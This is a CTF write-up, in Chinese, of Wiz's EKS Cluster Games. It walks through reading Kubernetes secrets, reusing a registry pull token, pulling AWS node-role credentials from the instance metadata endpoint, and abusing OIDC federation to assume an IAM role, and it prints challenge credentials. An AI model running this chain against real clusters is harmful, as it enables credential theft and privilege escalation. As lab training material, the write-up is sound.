---
title: WIZ EKS Cluster Games WP
---

<center><h1>WIZ EKS Cluster Games WP</h1><h2>本文作者：Esonhugh</h2><br><br></center>

---

## TL;DR

研究云安全的 WIZ 公司发布了新一个关于 AWS 云上集群 EKS 的挑战赛 [EKSClusterGame](https://eksclustergames.com/challenge/1) 。和之前 BigIAM Challenge (纯粹的云服务商攻防)略有不同，这次的挑战赛更加专注于 k8s 云原生利用以及集群服务 AWS 这类云服务的联邦攻击手段。

> 题外话，知道这个小游戏也是因为关注了 kubecon 2023 Shanghai 那会儿和议题 ETCD 后利用的演讲者 [@LoBuHi](https://twitter.com/lobuhisec) (from NCC Group) 的推特，发现最近出了新的比赛。
>
> 同时，这次 game 中，他也帮助了我很多。

## Level1: Secret

权限很简单就是当前命名空间（NS）下的 secrets get list 权限，非常简单，直接一条指令把 secret 中的数据拿出来即可。

```bash
kubectl get secrets -o yaml

apiVersion: v1
items:
- apiVersion: v1
  data:
    flag: d2l6X2Vrc19jaGFs{base64 encode data}lZF9zZWNyZXRfYWNjZXNzfQ==
  kind: Secret
  metadata:
    creationTimestamp: "2023-11-01T13:02:08Z"
    name: log-rotate
    namespace: challenge1
    resourceVersion: "890951"
    uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
  type: Opaque
kind: List
metadata:
  resourceVersion: ""
```

不过需要注意的是 secrets 中的值是经过 base64 编码的，浅浅的解一下。

```
wiz_eks_challenge{omg_over_privileged_secret_access}
```
## Level2: ImageInspection

第二题开始贴合实战场景了，我们具有的权限为：

```yaml
pod: [get, list]
secret: get
```

这个权限下，我们无法列出 secrets，具体的 list get 的区别可以看看 stackoverflow 社区的小讲解：[stackoverflow.com/questions/58159866/get-vs-list-in-kubernetes-rbac](https://stackoverflow.com/questions/58159866/get-vs-list-in-kubernetes-rbac)

所以我们可以先查看一下 pod 里有什么先。

```bash
kubectl get pods -o yaml

apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
	....
	name: database-pod-2c9b3a4e
    namespace: challenge2
  spec:
    containers:
    - image: eksclustergames/base_ext_image
      imagePullPolicy: Always
      name: my-container
      ......
    imagePullSecrets:
    - name: registry-pull-secrets-780bab1d
    nodeName: ip-192-168-21-50.us-west-1.compute.internal
    volumes:
    - name: kube-api-access-cq4m2
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
......
```

可以发现这里只有一个 pod，并且有 imagePullSecret 字段。 直接去获取对应的 secret 进行解密处理。登陆 docker 后，pull 当前 pod 的 image

```bash
kubectl get secrets registry-pull-secrets-780bab1d -o yaml

[base64 decoded]
{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlVI4NW1H{base64 enode}w=="}}}

# reuse the cred
docker login -u eksclustergames
Password: dckr_pat_YtncV-R85mAAAAAAAACo
```

docker 登陆完成后，pull 当前 pod 的 images

```bash
docker pull docker.io/eksclustergames/base_ext_image
```

审计整个 image 创建历史

```bash
 docker history  add093cd268d --no-trunc
# no trunc 防止过长的字符串被切割成小段
IMAGE                                                                     CREATED        CREATED BY                                                                                                                                                            SIZE      COMMENT
sha256:add093cd268deb7817aee1887b620628211a04e8733d22ab5c910f3b6cc91867   4 days ago     CMD ["/bin/sleep" "3133337"]                                                                                                                                          0B        buildkit.dockerfile.v0
<missing>                                                                 4 days ago     RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}' > /flag.txt # buildkit   124B      buildkit.dockerfile.v0
<missing>                                                                 3 months ago   /bin/sh -c #(nop)  CMD ["sh"]                                                                                                                                         0B
<missing>                                                                 3 months ago   /bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in /                                                                      4.26MB
```


```
wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}
```

### Other found

#### Kubernetes service account changes with version

- 1.20（含 1.20）之前的版本，在创建 sa 时会自动创建一个 secret，然后这个会把这个 secret 通过投射卷挂载到 pod 里，该 secret 里面包含的 token 是永久有效的。
- 1.21~1.23 版本，在创建 sa 时也会自动创建 secret，但是在 pod 里并不会使用 secret 里的 token，而是由 kubelet 到 TokenRequest API 去申请一个 token，该 token 默认有效期为一年，但是 pod 每一个小时会更新一次 token。
- 1.24 版本及以上，在创建 sa 时不再自动创建 secret 了，只保留由 kubelet 到 TokenRequest API 去申请 token

## Level3: Attack ECR

这里我们具有的权限为：

```yaml
pod: [get, list]

# but we are in the EKS and aws
```

需要注意的是 **我们当前环境存在于 pod 中，而 pod 存在于 eks 中，也在 aws 上** ，这意味着我们可以尝试探索一下 是否存在 eks 绑定 role 的情况。

通过探测 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 可以获知以下 endpoint

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2A[AKID]XMYUFF5J","Expiration":"2023-11-03 10:24:09+00:00","SecretAccessKey":"YPaIqb[AKSK]+I3nF","SessionToken":"FwoGZX[LONG ST]NrD6dG"}
```

看看我是谁

```bash
# 一顿 export 猛如虎
export AWS_ACCESS_KEY_ID=ASIA[AKID]5J
export AWS_SECRET_ACCESS_KEY=YPa[AKSK]+I3nF
export AWS_SESSION_TOKEN=Fw[ST]rD6dG
aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

题目描述希望我们找到 image 并且再次进行审计, 顺带提及，这里为了方便，安装好了 crane ，这次是 2 的升级版。

[docs.aws.amazon.com/cli/latest/reference/ecr/get-login-password.html](https://docs.aws.amazon.com/cli/latest/reference/ecr/get-login-password.html)

aws 获取 docker 登陆 token 的文档在这里。 参考 example 直接填写，并且将 docker 替换为 crane

> Crane 参考本小节下方 other information 的 crane 部分

```bash
aws ecr get-login-password|crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS --password-stdin

# 成功后只有这一行
2023/MM/DD HH:mm:ss logged in via /home/user/.docker/config.json
```

登陆成功后，直接对远程镜像进行解析。

```bash
crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01

{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:07.782534085Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop) CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"
    ]
  }
}
```

得到 flag

```
wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}
```

### Other Information

#### Crane

这是一个类似 docker client 的工具，但是可以处理一些远程的容器镜像的管理

Doc: [github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md)

CheatSheet 如下

[github.com/google/go-containerregistry/blob/main/cmd/crane/recipes.md](https://github.com/google/go-containerregistry/blob/main/cmd/crane/recipes.md)

## Level4: AWS to EKS

这部分中的集群内，我们是一个没有任何权限的服务账号。所以 kubectl 基本无用了，但是这一层解锁了 AWS 凭据。 再看描述，说明需要提权到被限制的 k8s node 节点权限 (EKS层面)

```bash
kubectl auth can-i --list
```

习惯性的，先看看我们在 aws 里是谁

```bash
aws sts get-caller-identity

{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

这里的 [ARN](https://docs.aws.amazon.com/zh_tw/IAM/latest/UserGuide/reference-arns.html) 可以获知到不少信息

```bash
arn:partition:service:region:account-id:resource-type/resource-id
arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282

partition: aws
service: sts
region:
account-id: 688655246681
resource-type: assumed-role
resource-id: eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282

cluster-name: eks-challenge-cluster
```

检查一下 aws eks 指令下面需要的东西还有能做的事

1. 查询 [AWS eks cli 文档](https://docs.aws.amazon.com/cli/latest/reference/eks/)
2. 我们的目的是升级 kubectl 交互的权限，可以找到文章 [Hacktricks-Cloud EKS 后利用](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-eks-post-exploitation)

### method 1 update kubeconfig

这里看起来需要处理一下 kubeconfig 了

整理一下

``` yaml
describe-cache-parametersapiVersion: v1
clusters:
  - cluster:
      insecure-skip-tls-verify: true
      server: https://10.100.0.1
    name: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
contexts:
  - context:
      cluster: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
      user: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
    name: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
current-context: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
kind: Config
preferences: {}
users:
  - name: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
    user:
      exec:
        apiVersion: client.authentication.k8s.io/v1beta1
        args:
          - --region
          - us-west-2
          - eks
          - get-token
          - --cluster-name
          - eks-challenge-cluster
        command: aws
        env:
          - name: AWS_ACCESS_KEY_ID
            value: ASIA2AVYNEVMR5BQAJIY
          - name: AWS_SECRET_ACCESS_KEY
            value: eI2Wc1KGCP+7wePJKgHYeM7iqkR0ojLjlsR5cNHm
          - name: AWS_SESSION_TOKEN
            value: FwoGZXIvYXdzEDoaDBNUSCM4abbuuVepLyK3AYzIOalPXv44GzNtt2zYb4ukzwkyPMhA2hI2nCuuLJW4+ENOXqdBgJChbyirWoclfV9bGFkcFxFaslXw6Pf405KRk8blXx/iqmQCuGIGXAZomAsp8y6DtVMJ8T7nRKytFcMplBG4N5XWsM8VF8XfVXwskyKn6X37LxUSiqbI4lNRt/OWcxe4lD3MwZODuvUQvm9GhuUHxZi4IiYE2Hkt3HsGKiNM/GCXaMU1nCapjPufufumNx464Cj055mqBjIt+KQHLUq4AsMMmE0baixd2L9DAVhsECSYlx+uhDbEnjYuumPJVyVjfl5YlK0z
        interactiveMode: IfAvailable
        provideClusterInfo: false
```

```bash
export KUBECONFIG=<above-content.yaml>
```
### Method 2 direct use token

```bash
aws eks get-token --cluster-name eks-challenge-cluster
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2023-XX-XXTXX:XX:XXX",
        "token": "k8s-aws-v1.aHR0{TOKEN_URL IN BASE64ed}A3OTFhMDI4NjEy"
    }
}
```

```bash
alias kubectl="kubectl --token={status.token k8s-aws-v1.aHR0{TOKEN_URL IN BASE64ed}A3OTFhMDI4NjEy}"
```

### Final

这里我们如果不确定有什么权限可以通过 下面的指令 进行查看

``` bash
kubectl auth can-i --list

Resources                                       Non-Resource URLs   Resource Names     Verbs
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
```

再获取一下 flag

```bash
kubectl get secrets -o yaml
```

```
wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}
```

## Level5: back AWS with OIDC

这个层级是 Level 4 的更进一步。

```json
{
  "Version": "2012-10-17",
  "Statement":
    [
      {
        "Effect": "Allow",
        "Principal":
          {
            "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
          },
        "Action": "sts:AssumeRoleWithWebIdentity",
        "Condition":
          {
            "StringEquals":
              {
                "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com",
	            // 这里没有更近一步限制 https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse
	            // 通过搜索这段 OIDC 字符串 或 Policy
              },
          },
      },
    ],
}
---
{
  "Policy":
    {
      "Statement":
        [
          {
            "Action": ["s3:GetObject", "s3:ListBucket"],
            "Effect": "Allow",
            "Resource":
              [
                "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag",
              ],
              // 目标的 flag 位置 在 s3
              // bucket: challenge-flag-bucket-3ff1ae2
              // path: flag
          },
        ],
      "Version": "2012-10-17",
    },
}
---
{
  "secrets": ["get", "list"],
  "serviceaccounts": ["get", "list"],
  "pods": ["get", "list"],
  "serviceaccounts/token": ["create"], // 这里限制写的不对
}
```

这里限制更为严格， 通过 L4 提及的 kubectl 权限枚举后可以发现 我们其实只能创建 serviceaccount 名字为 debug-sa 的 token

``` yaml
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
-----
apiVersion: v1
items:
  - apiVersion: v1
    kind: ServiceAccount
    metadata:
      annotations:
        description: This is a dummy service account with empty policy attached
        eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
      creationTimestamp: "2023-10-31T20:07:37Z"
      name: debug-sa
      # kubectl create token --serviceaccount debug-sa
      namespace: challenge5
      resourceVersion: "671929"
      uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
  - apiVersion: v1
    kind: ServiceAccount
    metadata:
      annotations:
	    # 需要模拟的对应的 Role 权限 IAM
        eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
      creationTimestamp: "2023-10-31T20:07:34Z"
      name: s3access-sa
      namespace: challenge5
      resourceVersion: "671916"
      uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
kind: List
metadata:
  resourceVersion: ""
```

这里我们重新理解一下我们的环境。


我们可以通过搜索官方给出的 aws 配置中的 oidc aws k8s 等关键词，可以轻松找到错误配置。

当然对方给出的示例一类的内容，有通过创建 Pod 的，手动处理的不多甚至很少。

很显然，在正常情况下，我们是无法使用 kubectl create token 直接生成的 k8s service account 令牌访问 aws（无 audience）。

> 有人通过创建 pod 绑定服务账户后，成功滥用了它。

[cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse) 【Hacktricks 这里没有写的非常清楚如何利用，但是说明了这里存在这样的漏洞】

既然如此一定有什么办法，让我通过请求 K8S api 服务， 来委托 k8s 去请求 aws ，并且对 k8s 中的 debug-sa 进行身份验证并获取 aws Web 凭证，这是拿到 aws session 的第一步。

因为这是向 k8s 请求，所以我们需要着重检查 Kubernetes 的文档，直接搜索关键词 OIDC 可能不会有什么结果，这里我们需要注意一些关于在 Kubernetes 中 **使用** 或 **配置** AWS 访问的 OIDC 的信息。我们将注意到一些 Audience 关键词，例如 [配置 pod 中的服务账户](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)  这和其他人的文章，题目提供的配置信息是基本重合，我们即使没有接触过“受众” 这一类概念，或许也可以推理得到相同的结果。

```bash
kubectl create token --help

example
  # Request a token with a custom audience
  kubectl create token myapp --audience https://example.com
	.....
Options:
    --audience=[]:
        Audience of the requested token. If unset, defaults to requesting a token for use with the
        Kubernetes API server. May be repeated to request a token valid for multiple audiences.
	....
```

接下来使用方法就非常简单了。

```bash
kubectl create token debug-sa-token --audience sts.amazonaws.com
```

接下来解决了 aws token 的问题，下一步就是模拟 IAM 权限了。

这个稍微查询一下文档基本也问题不大，就是使用 web token 拿到 STS 临时凭据了。

查询 STS 部分文档，可以发现 [action::AssumeRoleWithWebIdentity](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html) 明确提到 OIDC token 也可以通过这个函数进行鉴权， cli 操作如下 https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html

构建命令：

```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name sessionABC --web-identity-token ${Token Previous Step}
```

AWS 返回 STS 后，export 成环境变量，直接拷贝出 flag

```bash
aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag /tmp/flag
```

```
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
```
### Other Information

#### What's OIDC

官方给出的策略中， OIDC 的配置表明 K8S <=> AWS 之间存在 OIDC 相互的“信任”关系 ，本质上说就是可以通过 OAuth V2 拓展的手段，可以使得 AWS 中的 IAM 用户，角色，权限和 Kubernetes 集群中的用户（服务账户），权限，角色之间相互打通，从一个平台验证到另一个平台。

## Summary

云服务很大程度上都是在基于凭据的基础上进行的，云对于大部分凭据的使用方法是签名和签名算法。

AKSK、AKSK/STS 这两类凭据是云服务和云厂商服务之间交互的重要凭据。

当 AKSK 并不能如预期时获取的时候，云平台云服务之间的角色绑定失误，以及类似的 OAuth 认证信任关系滥用等等，涉及第三方角色权限的机制时 STS token 常常会发挥一些意想不到的作用。 这类是更为复杂更容易隐藏的攻击向量。

当然由于 AWS 一类云服务厂商才是实际存储和保存 IAM 以及账户信任的人，在攻击者没有适当权限的时候，几乎无法枚举对应的关系，对攻击者来说，获取这类信息存在一定的学习成本和对于目标云环境理解的成本的。其信息收集难度，还是比 linpeas linux 本地提权一把索，bloodhound 六级域控管理员要大很多的。


## 鸣谢 Thanks

**Wiz** @Wiz.io

**LoBuhi** @lobuhisec

## Finisher Banner

[eksclustergames.com/finisher/AYwUrrIK](https://eksclustergames.com/finisher/AYwUrrIK)

<div align=center><img width="600" src="/img/2000000025.jpeg" div align=center/></div></br>

**原文地址：[github.com/Esonhugh/WizEKSClusterGame](https://github.com/Esonhugh/WizEKSClusterGame)**


<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2023 年 11 月 13 日"
    }
  }
</script>
